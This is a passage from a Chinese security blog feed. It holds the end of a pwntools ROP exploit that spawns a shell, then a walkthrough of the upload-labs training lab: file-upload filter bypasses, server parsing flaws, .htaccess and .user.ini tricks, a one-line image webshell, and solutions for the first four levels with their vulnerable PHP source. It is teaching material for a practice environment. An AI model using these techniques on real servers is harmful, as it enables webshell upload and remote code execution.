class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rop'</span><span class="token punctuation">)</span>pop_eax_ret <span class="token operator">=</span> <span class="token number">0x080bb196</span>pop_edx_ecx_ebx_ret <span class="token operator">=</span> <span class="token number">0x0806eb90</span>int_0x80 <span class="token operator">=</span> <span class="token number">0x08049421</span>binsh <span class="token operator">=</span> <span class="token number">0x80be408</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> pop_eax_ret<span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">,</span> pop_edx_ecx_ebx_ret<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> binsh<span class="token punctuation">,</span> int_0x80<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b16encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-labs</title>
      <link href="/2019/09/01/upload-labs/"/>
      <url>/2019/09/01/upload-labs/</url>
      
        <content type="html"><![CDATA[<h3 id="一、简单上传绕过姿势"><a href="#一、简单上传绕过姿势" class="headerlink" title="一、简单上传绕过姿势"></a>一、简单上传绕过姿势</h3><h5 id="1-1、前端检查扩展名"><a href="#1-1、前端检查扩展名" class="headerlink" title="1.1、前端检查扩展名"></a>1.1、前端检查扩展名</h5><p>抓包绕过即可。</p><h5 id="1-2、Content-Type-检测文件类型"><a href="#1-2、Content-Type-检测文件类型" class="headerlink" title="1.2、Content-Type 检测文件类型"></a>1.2、Content-Type 检测文件类型</h5><a id="more"></a><p>抓包修改 Content-Type 类型，使其符合白名单规则。</p><h5 id="1-3、绕过服务器文件扩展名检测上传webshell"><a href="#1-3、绕过服务器文件扩展名检测上传webshell" class="headerlink" title="1.3、绕过服务器文件扩展名检测上传webshell"></a>1.3、绕过服务器文件扩展名检测上传webshell</h5><p>服务器端文件扩展名检测是利用服务器端应用程序检测用户上传文件的后缀名，从而做出允许或者阻止的一种方法，该方法包含黑名单和白名单两种形式，具体如下：</p><pre><code> 黑名单检测：一般是建立一个专门的blacklist文件，里面枚举常见的危险文件后缀。白名单检测：一般是定义一个允许或者阻止用户上传文件类型的后缀的文件，里面枚举相应的文件后缀。</code></pre><p>绕过黑名单检测方法：</p><ul><li><p>（1）文件名大小写绕过：诸如AsP、Aspx之类的后缀绕过黑名单检测。</p></li><li><p>（2）黑名单列表绕过：用黑名单里没有的后缀文件进行攻击，iis默认执行.asp、.asa、.cer，有时候黑名单过滤不全，没有过滤掉像后缀为asa、cer之类的文件，但这些文件可以像asp文件一样执行，此时可以使用这些后缀绕过黑名单。</p></li><li><p>（3）特殊文件名绕过：比如发送的HTTP包里把文件名改成test.asp. 或test.asp_(下划线为空格)，这两种命名方式在windows系统里是不被允许的，所以需要在代理工具burpsuite进行修改，然后绕过验证后，会被windows系统自动去掉后面的点和空格，但注意Unix/Linux系统没有此特性。</p></li><li><p>（4）0x00截断：在许多语言的常用字符串处理函数中，0x00被认为是终止符，比如应用只允许上传jpg图片，那么可以构造文件名为2.asp%00.jpg，.jpg绕过了应用的上传文件类型判断，但对于服务器来说，此文件因为%00字符截断的关系，最终会以2.asp存入路径里。<br>具体操作<br>文件名改成<code>xxx.php+.jpg</code>,因为+的hex值是2b,可以通过burp抓包将2b改成00<br><img src="1.png" alt=""><br>或者直接在文件名上urldecode<br><img src="2.png" alt=""><br>绕过白名单检测方法</p></li><li><p>（1）0x00截断：基于白名单检查主要使用0x00截断绕过，同黑名单0x00截断绕过。但对于服务器来说，由于后台某些函数作用（诸如CreateTextFile()），此文件会被%00字符截断，最终会以2.asp存入路径里。</p></li></ul><h5 id="1-4、绕过文件内容检测上传webshell"><a href="#1-4、绕过文件内容检测上传webshell" class="headerlink" title="1.4、绕过文件内容检测上传webshell"></a>1.4、绕过文件内容检测上传webshell</h5><p>件内容检测即通过检测特定文件某些特殊标志位来判断是否是允许上传的一种方法，以后缀为.jpg图片文件为例，该文件头有一组特殊二进制数标识 FF D8 FF E0 00 10 4A 46 49 46（这些二进制数也叫文件幻数），那么就可以通过判断上传文件的文件头来验证文件的类型。<br>　　其实检测文件幻数只是检测的一项内容，还可以对文件相关信息、文件渲染加载后检测，面对这些检测，可以把一句话木马注入图片文件最后面，这样既实现了代码注入也不会破坏图片结构，具体步骤包括：代码注入图片、引用创建的文件、使用客户端连接一句话木马。</p><h5 id="1-5、利用服务器解析漏洞"><a href="#1-5、利用服务器解析漏洞" class="headerlink" title="1.5、利用服务器解析漏洞"></a>1.5、利用服务器解析漏洞</h5><ul><li><p>1）IIS6.0解析漏洞1<br>　　此洞原理是处理文件扩展名出错，导致将/<em>.asp/目录下的所有文件都作为asp文件进行解析。此外具有此特性的不单单是类似/</em>.asp/目录，还包括/<em>.cer /、/</em>.asa /、/<em>.cdx /、/</em>.cer (此种类型浏览器直接输入不允许，需要借助burpsuite工具)、/<em>.asa \、/</em>.cdx \目录，本例子以/*.asp/目录举例。</p></li><li><p>（2）IIS6.0解析漏洞2<br>　　该漏洞的原理是IIS6.0不能正确够解析文件名包含分号（;）的文件，因此诸如2.asp;xx.jpg类似的文件会被解析成2.asp可执行文件，从而导致脚本被执行。此外具有此特性的不单单是类似2.asp;xx.jpg，还包括2.cer;xx.jpg、2.asa;xx.jpg、2.cdx;xx.jpg类型。</p></li><li><p>（3）IIS7.0/7.5解析漏洞<br>　　IIS7.0/7.5是对php 解析时有一个解析漏洞，只要在url后面追加上字符串”/任意文件名.php”就会按照php的方式去解析，其实这个漏洞是出自php-cgi的漏洞，与IIS7.0/7.5本身无关，具体例子如下。<br>服务器端test.jpg代码为：<? php echo "Hello World"; ?><br>输入：<code>http://[IP]/test.jpg/noexist.php</code>，会将test.jpg当做php进行解析，其中noexist.php是不存在的文件（但后缀必须是.php）。</p></li><li><p>（4）Apache文件解析漏洞（不过本地我没跑过orz）<br>　　Apache对于文件名的解析是从后往前解析的，直到遇见一个apache认识的文件类型为止，比如phpshell.php.rar.rar，由于apache不认识.rar文件类型，所以会一直遍历后缀直到.php，然后认为这是个php类型的文件，这样的话可以上传一个包含一句话木马文件名类似phpshell.php.rar.rar的文件，访问该文件将会被当成php文件解析执行，具有此漏洞的版本包括：Apache 2.2.11、Apache 2.2.17、Apache 2.2.6、Apache 2.0.59、Apache 2.2.8。</p></li><li><p>（5）Nginx解析漏洞<br>　　该漏洞是对一个任意文件名，在后面添加/任意文件名.php的解析漏洞，比如源文件名为nginx.jpg，可以添加成nginx.jpg/x.php，nginx就会把nginx.jpg当成php文件来解析，其实可以说这个漏洞与nginx本身关系不大，nginx只是作为一个代理把请求转发给fastcgi server，php在后端处理这一切，漏洞原因在fasgcgi方式下，php获取环境变量的方式有关，该漏洞官方没有补丁，php认为是一个新特性，为预防该漏洞官方建议修改php.ini文件中cgi.fix_pathinfo为0。</p></li><li><p>nginx还有一个自身的漏洞，就是它可以对任意文件名后面添加%00.php当成php文件来解析，该漏洞出现在nginx较低版本，包括nginx 0.5.<em>、nginx 0.6.</em>、nginx 0.7 &lt;= 0.7.65、nginx 0.8 &lt;= 0.8.37。</p></li></ul><h5 id="1-6、利用-htaccess文件上传webshell"><a href="#1-6、利用-htaccess文件上传webshell" class="headerlink" title="1.6、利用.htaccess文件上传webshell"></a>1.6、利用.htaccess文件上传webshell</h5><p>htaccess文件的作用主要是对主配置文件没有访问权限，但又想改变某目录配置情况下使用，假如服务器端没有过滤后缀为.htaccess文件，那么攻击者可以构造该文件修改所在目录文件的配置，比如修改该文件下含“haha”字符串的所有文件按照php文件来解析，那么攻击者在上传构造的.htaccess文件后，再上传仍以后缀只有包含“haha”字符串的一句话木马文件，该文件会被当成php文件解析，具体如下：</p><ul><li>建立特定.htaccess 文件</li><li>建立一句话木马文件</li><li>上传上述文件，并使用菜刀连接</li></ul><p>添加文件.htaccess，写入<br><code>AddType application/x-httpd-php .jpg</code><br>或者</p><pre><code>&lt;FilesMatch &quot;shell.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><h5 id="1-7、利用-user-ini"><a href="#1-7、利用-user-ini" class="headerlink" title="1.7、利用 .user.ini"></a>1.7、利用 .user.ini</h5><p>nginx中使用<br>我们可以上传一个这样的.user.ini：</p><pre><code>GIF89aauto_prepend_file=a.jpg</code></pre><p>然后再上传一个这样的图片马a.jpg：</p><pre><code>GIF89a&lt;script language=&#39;php&#39;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;</code></pre><p><a href="https://xz.aliyun.com/t/6091" target="_blank" rel="noopener">https://xz.aliyun.com/t/6091</a></p><hr><p>正文</p><hr><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>github地址：<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a><br>直接跑docker就完事了</p><p>创建镜像</p><pre class=" language-bash"><code class="language-bash">$ <span class="token function">cd</span> upload-labs/docker$ docker build -t upload-labs <span class="token keyword">.</span></code></pre><!--more--><p>或</p><pre class=" language-shell"><code class="language-shell">$ docker pull c0ny1/upload-labs</code></pre><p>创建容器</p><pre class=" language-bash"><code class="language-bash">$ docker run -d -p 80:80 upload-labs:latest</code></pre><p><img src="1.png" alt=""><br>所有题目我们均上传phpinfo.php，执行成功便代表解出题目</p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>由前端限制，直接控制台修改函数就行<br>源码</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//定义允许上传的文件类型</span>    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//提取上传文件的类型</span>    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//判断上传文件类型是否允许上传</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="Hack"><a href="#Hack" class="headerlink" title="Hack:"></a>Hack:</h4><p><img src="2.png" alt=""><br>上传成功-前端果然无安全可言~</p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>只判断了<code>Content-Type</code></p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="Hack-1"><a href="#Hack-1" class="headerlink" title="Hack:"></a>Hack:</h4><p>方法1：上传一个phpinfo.php,然后抓包修改<code>Content-Type: image/jpeg</code><br>方法2：上传一个phpinfo.jpg，然后抓包修改后缀为php<br><img src="3.png" alt=""></p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>后端禁了后缀<code>&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;</code><br>如果严格大小写可以大小写绕过，忽略了大小写可以用别名：php2, php3, php4, php5, phps, pht, phtm, phtml<br>源码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'.asp'</span><span class="token punctuation">,</span><span class="token string">'.aspx'</span><span class="token punctuation">,</span><span class="token string">'.php'</span><span class="token punctuation">,</span><span class="token string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//收尾去空</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="Hack-2"><a href="#Hack-2" class="headerlink" title="Hack:"></a>Hack:</h4><p>php3,phtml绕过</p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>通过htaccess绕过<br>本题基本上ban了所有我们想要的后缀，除了jpg,但是没有ban<code>.htaccess</code></p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">"php1"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">"pHp1"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//收尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件不允许上传!'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token 